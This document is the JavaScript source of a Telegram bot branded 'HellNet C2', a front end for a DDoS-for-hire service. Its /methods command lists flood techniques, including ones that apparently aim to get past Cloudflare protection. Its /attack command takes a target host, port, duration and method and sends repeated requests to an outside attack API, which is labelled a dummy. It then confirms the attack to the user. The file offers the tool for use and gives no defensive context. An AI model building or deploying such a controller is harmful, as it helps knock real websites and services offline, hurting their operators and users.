// Credit: X9toon | 
const { fetchJson, range, parseMarkdown } = require('./lib/function');
const { Telegraf } = require('telegraf');
const help = require('./lib/help');
const tele = require('./lib/tele');
const chalk = require('chalk');
const axios = require('axios');
const os = require('os');
const fs = require('fs');
const gradient = require('gradient-string');

const { apikey, bot_token, owner, ownerLink, version, prefix } = JSON.parse(fs.readFileSync(`./config.json`));

let entertainment = {};

if (bot_token == '') {
	return console.log('=== BOT TOKEN CANNOT BE EMPTY ===');
}

const bot = new Telegraf(bot_token);

bot.command('start', async (ctx) => {
	const user = tele.getUser(ctx.message.from);
	await help.start(ctx, user.full_name);
	await ctx.deleteMessage();
});

bot.command('help', async (ctx) => {
	const user = tele.getUser(ctx.message.from);
	await help.help(ctx, user.full_name, ctx.message.from.id.toString());
});

bot.on('callback_query', async (ctx) => {
	const cb_data = ctx.callbackQuery.data.split('-');
	const user_id = Number(cb_data[1]);
	if (ctx.callbackQuery.from.id != user_id)
		return ctx.answerCbQuery('Sorry, You do not have the right to access this button.', { show_alert: true });

	const callback_data = cb_data[0];
	const user = tele.getUser(ctx.callbackQuery.from);
	await help[callback_data](ctx, user.full_name, user_id);
});

bot.on('message', async (ctx) => {
	try {
		const body = ctx.message.text || ctx.message.caption || '';
		let comm = body.trim().split(' ').shift().toLowerCase();
		let cmd = false;
		if (prefix != '' && body.startsWith(prefix)) {
			cmd = true;
			comm = body.slice(1).trim().split(' ').shift().toLowerCase();
		}
		const command = comm;
		const args = await tele.getArgs(ctx);
		const user = tele.getUser(ctx.message.from);

		const reply = async (text) => {
			for (let x of range(0, text.length, 4096)) {
				return await ctx.replyWithMarkdown(text.substr(x, 4096), { disable_web_page_preview: true });
			}
		};

		if (entertainment[ctx.update.message.from.id] === ctx.update.message.text.toLowerCase()) {
			delete entertainment[ctx.update.message.from.id];
			return reply('✅ Jawaban Anda benar.');
		}

		switch (command) {
			case 'help':
				await help.help(ctx, user.full_name, ctx.message.from.id.toString());
				break;

			case 'methods':
				await reply('🔥 *HellNet C2 Methods List* 🔥\n\n*Layer 4*\n- OVH\n\n*Layer 7*\n- TLSv1\n- TLSv2\n- DCOUNT\n- CF-UAM\n- BRUTALITY');
				break;

			case 'attack':
				if (args.length < 4) {
					return await reply(`⚠️ Usage: /attack [host] [port] [time] [method]\nExample: /attack example.com 443 60 TLSv2`);
				}
				const [host, port, time, method] = args;
				const baseUrl = `https://random-api-hellnet.com/attack`; // dummy API
				const attackUrl = `${baseUrl}?host=${host}&port=${port}&time=${time}&method=${method}`;

				for (let i = 0; i < 4; i++) {
					try {
						await axios.get(attackUrl);
					} catch (err) {
						console.log(chalk.red(`[ERROR] Attack request failed (${i + 1}):`, err.message));
					}
					await new Promise(r => setTimeout(r, 500));
				}

				await reply(`✅ *Attack Sent Successfully!*
🌐 Target: ${host}
⏱️ Time: ${time}s
🧨 Method: ${method}`);
				break;

			case 'status':
				const memory = process.memoryUsage();
				const uptime = process.uptime();
				await reply(`📊 *HellNet Status*\n
🖥️ RAM Used: ${(memory.rss / 1024 / 1024).toFixed(2)} MB
⏳ Uptime: ${Math.floor(uptime)} sec
🧬 Platform: ${os.platform()}
💻 Host: ${os.hostname()}`);
				break;
		}
	} catch (e) {
		console.log(chalk.whiteBright('├'), chalk.cyanBright('[  ERROR  ]'), chalk.redBright(e));
	}
});

bot.launch({ dropPendingUpdates: true });

bot.telegram.getMe().then((getme) => {
	const itsPrefix = prefix != '' ? prefix : 'No Prefix';
	const botInfo = `
	╔═══════════════════════════════════════╗
	║              HELLNET BOT             ║
	╠═══════════════════════════════════════╣
	║ 👤 Owner    : ${owner}                
	║ 🤖 Bot Name : ${getme.first_name}      
	║ 🛠️ Version  : ${version}               
	║ 💻 Host     : ${os.hostname()}        
	║ 🧬 Platform : ${os.platform()}         
	║ 🚀 Prefix   : ${itsPrefix}            
	╚═══════════════════════════════════════╝
	`;
	console.log(gradient.rainbow(botInfo));
	console.log(chalk.whiteBright('╭─── [ LOG ]'));
});

process.once('SIGINT', () => bot.stop('SIGINT'));
process.once('SIGTERM', () => bot.stop('SIGTERM'));